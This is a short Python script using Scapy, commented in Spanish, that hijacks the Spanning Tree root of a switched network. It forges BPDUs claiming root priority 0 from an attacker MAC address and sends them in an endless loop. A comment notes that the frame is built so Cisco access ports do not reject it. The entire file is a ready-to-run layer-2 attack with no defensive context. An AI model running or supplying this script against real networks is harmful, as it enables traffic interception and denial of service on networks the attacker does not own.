import time
from scapy.all import Dot3, LLC, STP, sendp

def secuestrar_raiz(interfaz="eth0", mac_atacante="00:11:22:33:44:55"):
    print("[*] Enviando BPDUs maliciosas de prioridad 0...")
    
    # Estructura limpia que Cisco no rechaza en puertos de acceso
    bpdu = (
        Dot3(dst="01:80:c2:00:00:00", src=mac_atacante) /
        LLC(dsap=0x42, ssap=0x42, ctrl=3) /
        STP(
            bpdutype=0x00, 
            bpduflags=0x00, 
            rootid=0x0000,          # Prioridad 0 absoluta
            rootmac=mac_atacante, 
            bridgeid=0x0000,        # El atacante dice ser la raíz
            bridgemac=mac_atacante
        )
    )

    while True:
        sendp(bpdu, iface=interfaz, verbose=False)
        time.sleep(2)

if __name__ == "__main__":
    secuestrar_raiz()
